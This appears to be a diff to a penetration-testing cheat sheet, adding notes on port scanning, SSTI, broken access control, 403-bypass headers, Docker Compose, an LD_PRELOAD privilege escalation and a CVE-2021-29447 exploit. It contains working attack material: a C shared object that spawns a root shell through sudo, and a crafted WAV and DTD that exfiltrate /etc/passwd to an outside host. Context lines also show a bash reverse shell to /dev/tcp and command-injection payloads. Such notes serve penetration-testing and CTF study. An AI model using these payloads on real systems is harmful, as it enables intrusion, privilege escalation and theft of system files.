@@ -10,6 +10,7 @@ Also, do check this notes here [https://github.com/aniqfakhrul/archives](https:/
 ```bash
 => Commands
 $ wget -m --no-passive ftp://anonymous:anonymous@10.10.10.10
+$ ftp 10.10.10.10 5581
 ```
 
 ### Port 22 (SSH)
@@ -436,6 +437,15 @@ $ python -c 'import itertools; print list(itertools.permutations(\[8890,7000,666
 
 ```
 
+### Port Scanning 
+
+```bash
+# No netstat or lsof
+$ declare -a array=($(tail -n +2 /proc/net/tcp | cut -d":" -f"3"|cut -d" " -f"1")) && for port in ${array[@]}; do echo $((0x$port)); done
+$ declare -a array=($(tail -n +2 /proc/net/tcp | cut -d":" -f"3"|cut -d" " -f"1")) && for port in ${array[@]}; do echo $((0x$port)); done | sort | uniq
+$ https://www.commandlinefu.com/commands/view/15313/check-open-ports-without-netstat-or-lsof
+```
+
 ### SQL Injection
 
 ```bash
@@ -860,6 +870,36 @@ https://www.codeguru.com/columns/kate/.net-website-security-guidelines-checklist
 %H:%M:%S';cat ../flag;#
 %H';date -f '../flag
 %H' -f '../flag
+```
+
+### Server-Side Template Injection (SSTI)
+
+```bash
+=> References
+$ https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+```
+
+### Broken Access Control
+
+```bash
+=> Look at robots.txt
+=> Check javascript (urls,endpoints)
+=> Check parameter (functionality -> role,modified)
+=> URL-based (403 bypass)
+	-> X-Original-URL : /admin/deleteUser
+	-> X-Rewrite-URL : /admin/deleteUser
+=> Try every Method (403 bypass)
+=> IDOR
+=> Check other user ID (unpredictable)
+=> Check response before redirect
+=> Check every step of functionality (multi-step) if its affected with broken access control.
+=> Referer-based (Add Referer Header)
+
+=> References
+$ https://portswigger.net/web-security/access-control
+$ https://infosecwriteups.com/begineers-crash-course-for-finding-access-control-vulnerabilities-in-the-web-apps-part-1-5b61cf4396c4
+$ https://infosecwriteups.com/begineers-crash-course-for-finding-access-control-vulnerabilities-in-the-web-apps-part-2-ce38eabfb81a
+
 ```
 
 ### Socat
@@ -2460,6 +2500,7 @@ passPhrase = string.Join("\"" + Environment.NewLine + "\"", passPhrase.Split()
 ```bash
 => Tools
 $ https://github.com/lobuhi/byp4xx
+  -> ./byp4xx.sh -c "http://localhost/"
 $ https://github.com/iamj0ker/bypass-403
 
 => Header
@@ -2467,7 +2508,8 @@ $ X-Originating-IP: 127.0.0.1
 $ X-Forwarded-For: 127.0.0.1 
 $ X-Remote-IP: 127.0.0.1 
 $ X-Remote-Addr: 127.0.0.1
-$ test
+$ X-Original-URL: /admin
+$ X-Rewrite-URL: /admin
 ```
 
 ### Mobsfscan
@@ -2610,6 +2652,17 @@ $ /container/json
 => References
 $ https://securityboulevard.com/2019/02/abusing-docker-api-socket/
 $ https://github.com/flast101/docker-privesc
+```
+
+### Docker-compose
+
+```bash
+# Commands
+docker-compose up --build --force-recreate -d
+docker-compose up --build -d
+
+# References
+https://docs.docker.com/compose/install/
 ```
 
 ### Dockerfile
@@ -3126,6 +3179,23 @@ vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -
 -> replace in root row
 -> root:c.gVrEYFACZTQ:0:0:root:/root:/bin/bash
 
+```
+
+### LD Preload
+
+```bash
+$ ===One===
+include <stdio.h>
+include <sys/types.h>
+include <stdlib.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");
+}
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+sudo LD_PRELOAD=/tmp/shell.so find
 ```
 
 # D. Exploit/CVE/Abuse/Misconf
@@ -3806,6 +3876,22 @@ exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.10.10/443 0>&1'");
 - /wp-content/plugins/post-pdf-export/images/download-icon.png
 - /dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd
 - https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2383/
+
+##===CVE-2021-29447===
+1. Create evil.dtd
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.4.3.51/?p=%file;'>" >
+
+2. Create payload.wav
+echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.4.3.51/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
+
+3. Host
+php -S 0.0.0.0:80
+
+4. Upload payload.wav to wordpress
+
+5. Look at php server
+- https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/
 ```
 
 ### NibbleBlog
